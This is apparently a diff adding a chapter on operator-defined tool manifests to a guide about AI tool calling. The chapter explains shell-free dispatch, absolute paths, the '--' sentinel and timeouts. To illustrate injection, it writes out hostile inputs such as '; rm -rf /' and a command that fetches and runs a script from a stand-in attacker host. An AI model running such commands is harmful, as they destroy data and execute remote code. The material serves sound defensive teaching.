@@ -608,13 +608,187 @@ Inside the client:
 
 Notice the tools never leave the client. The server is an *inference oracle* — it knows the model and runs it — but the side effects happen in the client. This is the architecture most production AI systems converge on.
 
+## Chapter 21 — Operator-Defined Tools at Deploy Time
+
+> *"Some tools are written by the agent's author. Some tools are written by the agent's operator. The interesting question is who gets to declare which is which."*
+
+So far in this book, every tool has been a function in your codebase: you wrote it, you reviewed it, you compiled it, you shipped it. That is the right model for tools that ship with the agent — `web_fetch`, `datetime`, `read_file`. The author owns them; the author maintains them.
+
+But there is a different role in production: **the operator**. The operator is the person running your agent in *their* environment. They have CLIs, internal scripts, deploy tools, monitoring queries — programs that exist on their box, that *your* code has never seen, that they want the model to be able to invoke.
+
+If your library has no answer for that role, the operator will reach for the worst available option: a generic shell tool. They will wire `bash` (or `system()`, or `subprocess`) into the agent and hope the model behaves. They will discover, eventually, that the model is creative.
+
+A better answer is the **operator manifest** — a deploy-time JSON file that declares exactly which commands the model is allowed to dispatch, what arguments each takes, and the resource caps. The operator picks the surface area; the library enforces the safety. The model fills in parameter values; the schema rejects everything else.
+
+Think of the manifest as **`sudoers` for tool calling**. Anyone who can write the file can run arbitrary commands as the agent's user. The file is part of the deploy artefact: code-reviewed, version-controlled, owned by the operator. The model never sees it, never writes to it, never escapes from it.
+
+### The shape of a good manifest
+
+A serious operator-tools manifest declares, for each entry:
+
+| Field | Why it matters |
+| --- | --- |
+| `name` | Identifier the model uses. Validated against a strict regex. Cannot collide with built-ins. |
+| `description` | Plain English. The model reads this to decide *when* to call the tool. The single most important field. |
+| `command` | **Absolute** path to a regular, executable file. No PATH lookup. |
+| `argv` | Template array of literals and `"{name}"` placeholders. **Whole-element only.** |
+| `parameters` | JSON-Schema-shaped: `type: object`, `properties: {...}`, `required: [...]`. |
+| `timeout_ms` | Cooperative deadline — SIGTERM, then SIGKILL after a grace. |
+| `max_output_bytes` | Per-call output cap. Excess discarded; child stays unblocked. |
+| `cwd` | Working directory. Either absolute or a `$SANDBOX`-style sentinel. |
+| `env_passthrough` | Allowlist of env vars to inherit. Default empty. |
+| `stderr` | `merge` or `discard`. |
+
+That schema, lightly disguised, is what every well-designed operator-tools subsystem ends up with. The fields are the questions a careful operator asks: *"Where does it live? What can it take? How long can it run? How much can it produce? What env does it need?"*
+
+### Why no shell
+
+The dispatcher is `fork()` + `execve(absolute_path, argv, envp)`. There is no `/bin/sh -c` anywhere in the call path. The consequence:
+
+A model argument that contains `; rm -rf /` is **one argv element**, not a command separator. A model argument that contains `$(curl evil.com/x | sh)` is one argv element, not a substitution. Backticks, redirects, glob metacharacters, `&&`, `||` — none of those are special outside a shell, and we never invoke a shell.
+
+This is a **structural** guarantee, not a "we sanitised the inputs" guarantee. Sanitisation is a moving target — every escape is a regex away from being wrong on some new platform. Structural absence of a parser is permanent. There is nothing to sanitise because there is nothing to escape.
+
+The price: pipes, redirects, globbing — none of those work without a shell. Operators who actually need them keep using a shell tool (which has to be honest about being unsafe). The manifest is for the 90% of tool calls that don't need a shell.
+
+> **⚠ Pitfall — building a "safe shell."** Every few years, somebody tries to ship a "safe shell" tool: a sandboxed `/bin/sh` with a denylist of dangerous commands. It never works. Shells are Turing-complete; denylists are leaky; the next clever trick is one Stack Overflow answer away. Don't try to make `bash` safe. Make `bash` rare instead, and give the operator something better for the common case.
+
+### Why absolute paths
+
+`command` must start with `/`. No `command: "uname"` accepted. Two reasons:
+
+1. **No PATH-hijack.** If the agent's `PATH` includes a writable directory (`~/.local/bin`, a containerised `/tmp`), an attacker who can drop a binary called `uname` into it would otherwise hijack the manifest's `host_uname` tool. Requiring an absolute path closes this. The operator picked `/usr/bin/uname` and that is exactly what runs.
+
+2. **No environment drift.** `command: "rg"` works on the dev box where ripgrep is in PATH and breaks in the production container where it isn't. Absolute paths force the operator to confront where the binary actually lives.
+
+`PATH` itself can still be passed through to the subprocess — git, for instance, invokes `git-log` via PATH. That's an operator decision per tool, declared in `env_passthrough`.
+
+### Why whole-element placeholders
+
+A manifest entry like:
+
+```json
+{ "argv": ["--filter={query}"] }
+```
+
+is rejected at load time. The valid form is:
+
+```json
+{ "argv": ["--filter", "{query}"] }
+```
+
+Why be strict about this? The first form looks innocent — and indeed, with `query = "foo"` it works. But the moment a model passes `query = "a b c"` you have to ask: do we quote the embedded space? What about quotes inside the value? What about `--filter=` with a trailing `=` followed by nothing? The first form invites a per-element interpolator, and writing a *correct* one is the same trap as writing a "safe shell."
+
+Splitting at the brace removes the question entirely. The literal `--filter` is its own element. The `{query}` is its own element. No interpolator, no escaping rules, no edge cases.
+
+GNU/POSIX CLIs almost universally accept the split form. Tools that don't (`--key=value` is sometimes mandatory, e.g. `git diff --output-indicator-new=>`) can be expressed with the literal in one element and the placeholder in the next, or with a wrapper script.
+
+### The end-of-options sentinel
+
+Even with whole-element placeholders, there is a residual risk: the wrapped binary itself might parse a value starting with `-` as a flag. A model passing `pattern = "-V"` to `pgrep` would print pgrep's version instead of searching.
+
+The fix is not in the library — the library can't know how each binary parses its arguments. The fix is in the manifest: insert a literal `"--"` between the flags and the user-controlled values:
+
+```json
+{ "argv": ["-a", "--", "{pattern}"] }
+```
+
+GNU coreutils, util-linux, git, grep, ripgrep, find, pgrep, jq — all of them honour `--` as "end of options, the rest are positional." Integer/number/boolean parameters don't need this (they can't start with `-` after JSON validation). String parameters do.
+
+This is one of those gotchas that you only think of *after* the first time someone in your organisation makes a manifest mistake. Bake the convention into your code review checklist for `--tools-json`.
+
+> **🔬 Under the hood — argument parsing without options-end.** GNU `getopt_long` rewrites `argv` in place by default: it scans every element, classifies each as "option" or "positional," and shuffles options to the front. Once it sees `--` it stops scanning. Without `--`, a positional argument that happens to start with `-` is misclassified. This is a feature; nobody is "going to fix" it. Defending against it is the operator's job.
+
+### Cooperative timeouts and the kill chain
+
+A serious manifest subsystem doesn't just `fork+exec` and hope. It puts the child in its own process group (`setpgid`), watches the deadline, and on timeout sends `SIGTERM` to the entire group — picking up grandchildren the wrapped command might have spawned. After a 1 s grace it escalates to `SIGKILL`. After several seconds of an unkillable subprocess (uninterruptible sleep, a kernel bug) it falls back to a blocking `waitpid` rather than spinning forever.
+
+Resources to bound at the same boundary:
+
+* **stdin** — closed before exec. The model has no way to feed bytes into the subprocess.
+* **fds** — every fd ≥ 3 closed in the child between fork and execve. The agent's HTTP transport, log files, KV cache mmaps don't leak in. (And the close-loop must be capped at a finite number — `RLIMIT_NOFILE = unlimited` will otherwise either skip the loop or stall it.)
+* **env** — opt-in allowlist. `LD_PRELOAD`, `PATH`, credentials don't leak unless the operator asked.
+* **stdout** — drained continuously, capped at `max_output_bytes`; the child stays unblocked because the pipe is always being read (excess silently discarded).
+* **lifetime** — on Linux, `prctl(PR_SET_PDEATHSIG, SIGKILL)` ties the subprocess to the parent. If the agent crashes, the kernel kills the subprocess instead of leaving it as a PID-1 orphan.
+
+None of those are exotic — together they are the difference between "this is a tool framework" and "this is a fork-and-pray launcher."
+
+### What about isolation?
+
+Notice what is **not** on the list: chroot, namespaces, seccomp, ulimit, network egress filters. The manifest subsystem does not isolate; it bounds. The subprocess runs with the agent's full uid/gid. It can read every file the agent can, talk to the network, signal other processes.
+
+This is a deliberate non-goal. Isolation is the operating system's job. Operators who need it run the agent inside a container, a firejail, an unprivileged user, or a Linux namespace — and the manifest subsystem composes cleanly with all of those (it does nothing that conflicts).
+
+What the manifest *does* is remove the trap-doors that would let a tool call leak *outside* the parent process's privilege boundary: the shell, the PATH search, the env inheritance, the fd inheritance, the orphan after parent death. Whatever the agent is allowed to do, the tool can do. Nothing more.
+
+### A worked example
+
+A read-only system inspector and a code search, in the same manifest:
+
+```json
+{
+  "version": 1,
+  "tools": [
+    {
+      "name": "host_uptime",
+      "description": "Return the system uptime and load averages. No arguments.",
+      "command": "/usr/bin/uptime",
+      "argv": [],
+      "parameters": { "type": "object", "properties": {} },
+      "timeout_ms": 2000,
+      "max_output_bytes": 4096,
+      "env_passthrough": [],
+      "stderr": "discard"
+    },
+    {
+      "name": "code_search",
+      "description": "Search the working tree for a pattern via ripgrep. Returns file:line:match.",
+      "command": "/usr/bin/rg",
+      "argv": ["--no-heading", "--line-number", "--max-count", "100", "--", "{pattern}", "."],
+      "parameters": {
+        "type": "object",
+        "properties": {
+          "pattern": { "type": "string", "description": "Literal or regex." }
+        },
+        "required": ["pattern"]
+      },
+      "timeout_ms": 15000,
+      "max_output_bytes": 262144,
+      "env_passthrough": ["HOME"],
+      "stderr": "merge",
+      "treat_nonzero_exit_as_error": false
+    }
+  ]
+}
+```
+
+The model can call `code_search(pattern: "TODO")` and it works. The model can call `code_search(pattern: "-V")` and it still works (the `--` sentinel saves us). The model can call `code_search(pattern: "; rm -rf /")` and ripgrep searches for that literal string (no shell). The model cannot call anything *not* in the manifest. The operator can read the file and know exactly what surface they have exposed.
+
+> **Exercise.** Take the manifest above. Without changing the schema, add a third tool that wraps `/usr/bin/jq` to filter a JSON file. List, for each new field you fill in, the failure mode that field's value is preventing.
+
+### When the manifest is the wrong answer
+
+Manifests are not the right shape for every operator need:
+
+* **Tools that need shared in-process state** — a database connection pool, an HTTP client with a session cookie, a vector index loaded into RAM. Each manifest call is a fresh `fork+exec`; there is no place to hold the state. Use an in-process tool (`Tool::builder().handle(...)` in C++, or whatever your library's typed-builder shape is).
+* **Tools that genuinely need a shell** — chains of pipes, redirects, glob expansion. Use a shell tool, but make it explicitly opt-in and acknowledge that you have lost the structural safety guarantees.
+* **Tools that need to be daemons** — anything that backgrounds itself and exits. The launcher pattern (parent exits, daemon survives) doesn't compose with the dispatcher's "wait for the child to finish" model. Run those out-of-band and expose a query-only tool to the agent.
+
+### A library is the right place for this
+
+You can write the fork+execve plumbing yourself in 200 lines of C. By the time you've added schema validation, fd hygiene, env hygiene, timeouts, the kill chain, the leading-dash check, the size caps, the manifest validator, and the error path that surfaces all of them with file/line context for the operator's eyes — you've written a library. Several hundred lines, including an audit pass.
+
+That is the right thing for one library to ship and many programs to use. The same way you don't write your own JSON parser any more, you should not write your own operator-tools subsystem. Get the safety boundaries from a library that has been audited; spend your time on the part of the agent only you can build.
+
+> **⚠ Pitfall — confusing the operator surface with the model surface.** A manifest is read by humans, served to the model. Mistakes in schema declarations, descriptions, or `--` placement are paid for at runtime: the model cheerfully misuses a poorly-described tool, and you don't notice until production. Treat manifests like API contracts: review them, version them, regression-test them. They are part of the program.
+
 ---
 
 # PART VII — Synthesis
 
 > *"By the end of this part, you should be able to describe, end to end, what happens between a user pressing Enter and the model returning an answer that called three tools. If you can, you understand AI tooling."*
 
-## Chapter 21 — The Hidden Complexity
+## Chapter 22 — The Hidden Complexity
 
 Step back and count what we have built up. To make tool calling work, a runtime must:
 
@@ -636,7 +810,7 @@ Now consider: **each of those steps has at least one mode-specific edge case.** 
 
 Get any one of these wrong and the agent works *most of the time*, which is the worst possible failure mode: enough success to ship, enough failure to embarrass.
 
-## Chapter 22 — Why A Library Exists
+## Chapter 23 — Why A Library Exists
 
 Reading the previous list, you can see the case for a library form itself.
 
@@ -663,7 +837,7 @@ Each tier should be discoverable from the previous, and each should have **safe 
 
 The case for the library, in one sentence: **without one, every team builds the same plumbing, and most teams build it wrong.** The plumbing is not a feature; it is the floor under your feature. Let someone who has gotten it wrong many times build it for you.
 
-## Chapter 23 — Closing: Tools Are The New Function Call
+## Chapter 24 — Closing: Tools Are The New Function Call
 
 We are watching a generational shift in how software is composed. Twenty years ago, the unit of composition was the function: I write a function, you call it, we agree on a signature.
 
